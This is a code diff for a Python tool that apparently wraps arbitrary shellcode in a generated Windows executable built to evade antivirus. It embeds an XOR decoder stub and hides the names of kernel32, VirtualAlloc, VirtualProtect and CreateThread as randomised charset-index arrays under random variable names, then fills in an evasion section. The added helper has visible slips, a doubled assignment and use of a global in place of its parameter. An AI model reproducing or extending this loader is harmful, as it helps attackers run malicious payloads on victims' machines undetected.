@@ -38,12 +38,21 @@ import subprocess
 import struct
 from sys import platform
 
-VERSION = "4.1"
+VERSION = "4.2"
 MAX_KEY_SIZE = 0x55555555
 IS_GCC_SET = False
 IS_LINUX = False
 CUSTOM_CONFIG = False
 ASM_DECODER = "\\xeb\\x2f\\x58\\x31\\xc9\\x89\\xcb\\x6a\\x04\\x5a\\x43\\xff\\x30\\x59\\x0f\\xc9\\x31\\xd9\\x81\\xf9[MAGIC]\\x75\\xf0\\x0f\\xcb\\x31\\xc9\\x81\\xc1[NUMBER_OF_CHUNK]\\x01\\xd0\\x31\\x18\\xe2\\xfa\\x2d[FULL_SIZE]\\xff\\xe0\\xe8\\xcc\\xff\\xff\\xff[OPCODE]"
+
+def str_to_bytes_array(charset, var_string, varname):
+	output = output = "\n\tDWORD %s[] = {" % varname
+	for i in range(0, len(var_string)):
+		for j in range(0, len(char_charset)):
+			if var_string[i] == charset[j]:
+				output += str(j) + ", "
+				break
+	return output[:-2] + "};"
 
 class Helper:
 
@@ -128,6 +137,10 @@ if __name__ == "__main__":
         
 	if not sys.argv[3].lower() == "none":
 		IS_GCC_SET = True
+		
+		
+	if not os.path.exists("output/"):
+		os.makedirs("output/")
 
 	shellcode = sys.argv[1]
 	outfile = "output/%s" % sys.argv[2]
@@ -205,47 +218,46 @@ if __name__ == "__main__":
 	char_charset = "".join(random.sample(char_charset, len(char_charset))) + helper.generate_random(random.randrange(10, 10000))
 
 	kernel32_var = helper.generate_random(random.randrange(10, 30))
-	SetProcessDEPPolicy_var = helper.generate_random(random.randrange(10, 30))
-
-	kernel32_string = "kernel32.dll"
-	SetProcessDEPPolicy_string = "SetProcessDEPPolicy"
-
-	kernel32_c_var = helper.generate_random(random.randrange(10, 30))
-	SetProcessDEPPolicy_c_var = helper.generate_random(random.randrange(10, 30))
-
-	func_name = helper.generate_random(random.randrange(10, 30))
-
-	helper.print_info("Generating random charset array for kernel32 and SetProcessDEPPolicy")
-	helper.print_info("Generating int array for \"%s\". Array size is: %d" % (kernel32_string, len(kernel32_string)))
+	virtualalloc_var = helper.generate_random(random.randrange(10, 30))
+	virtualprotect_var = helper.generate_random(random.randrange(10, 30))
+	createthread_var = helper.generate_random(random.randrange(10, 30))
 	
-	c_code_output = "DWORD %s[] = {" % kernel32_var
-	for i in range(0, len(kernel32_string)):
-		for j in range(0, len(char_charset)):
-			if kernel32_string[i] == char_charset[j]:
-				c_code_output += str(j) + ", "
-				break
+	kernel32_string = "kernel32.dll"
+	virtualalloc_string = "VirtualAlloc"
+	virtualprotect_string = "VirtualProtect"
+	createthread_string = "CreateThread"
 
-	c_code_output = c_code_output[:-2] + "};\n"
+	vars_definition = ""
+	vars_definition += str_to_bytes_array(char_charset, kernel32_string, kernel32_var)
+	vars_definition += str_to_bytes_array(char_charset, virtualalloc_string, virtualalloc_var)
+	vars_definition += str_to_bytes_array(char_charset, virtualprotect_string, virtualprotect_var)
+	vars_definition += str_to_bytes_array(char_charset, createthread_string, createthread_var)
 
-	helper.print_info("Generating int array for \"%s\". Array size is: %d" % (SetProcessDEPPolicy_string, len(SetProcessDEPPolicy_string)))
+	var_parser_func_name = helper.generate_random(random.randrange(10, 30))
+	
+	kernel32_char = helper.generate_random(random.randrange(10, 30))
+	virtualalloc_char = helper.generate_random(random.randrange(10, 30))
+	virtualprotect_char = helper.generate_random(random.randrange(10, 30))
+	createthread_char = helper.generate_random(random.randrange(10, 30))	
 
-	c_code_output += "\tDWORD %s[] = {" % SetProcessDEPPolicy_var
-	for i in range(0, len(SetProcessDEPPolicy_string)):
-		for j in range(0, len(char_charset)):
-			if SetProcessDEPPolicy_string[i] == char_charset[j]:
-				c_code_output += str(j) + ", "
-				break
-
-	c_code_output = c_code_output[:-2] + "};\n\tCHAR *" + kernel32_c_var + " = NULL;\n\tCHAR *" + SetProcessDEPPolicy_c_var + " = NULL;\n\t"
-	c_code_output += func_name + "(" + kernel32_var + ", " + str(len(kernel32_string)) + ", &" + kernel32_c_var + ");\n\t"
-	c_code_output += func_name + "(" + SetProcessDEPPolicy_var + ", " + str(len(SetProcessDEPPolicy_string)) + ", &" + SetProcessDEPPolicy_c_var + ");\n\t"
-	  
+	vars_definition += "\n\tCHAR *" + kernel32_char + " = NULL;"
+	vars_definition += "\n\tCHAR *" + virtualalloc_char + " = NULL;"
+	vars_definition += "\n\tCHAR *" + virtualprotect_char + " = NULL;"
+	vars_definition += "\n\tCHAR *" + createthread_char + " = NULL;"
+	
+	vars_definition += "\n\t%s(%s, %d, &%s);" % (var_parser_func_name, kernel32_var, len(kernel32_string), kernel32_char)
+	vars_definition += "\n\t%s(%s, %d, &%s);" % (var_parser_func_name, virtualalloc_var, len(virtualalloc_string), virtualalloc_char)
+	vars_definition += "\n\t%s(%s, %d, &%s);" % (var_parser_func_name, virtualprotect_var, len(virtualprotect_string), virtualprotect_char)
+	vars_definition += "\n\t%s(%s, %d, &%s);\n\t" % (var_parser_func_name, createthread_var, len(createthread_string), createthread_char)
+	
 	exe = exe.replace("[SHELLCODE]", final) \
-	.replace("[FUNC_ARRAY]", c_code_output) \
+	.replace("[FUNC_ARRAY]", vars_definition) \
 	.replace("[CHARSET_ARRAY]", char_charset) \
-	.replace("[FUNC_NAME]", func_name) \
-	.replace("[KERNEL32]", kernel32_c_var) \
-	.replace("[DEP]", SetProcessDEPPolicy_c_var) \
+	.replace("[FUNC_NAME]", var_parser_func_name) \
+	.replace("[KERNEL32]", kernel32_char) \
+	.replace("[VIRTUALALLOC]", virtualalloc_char) \
+	.replace("[VIRTUALPROTECT]", virtualprotect_char) \
+	.replace("[CREATETHREAD]", createthread_char) \
 	.replace("[EVASION]", evasion) \
 	.replace("[SHELLCODE_SIZE]", str(len(final) / 4))
 	
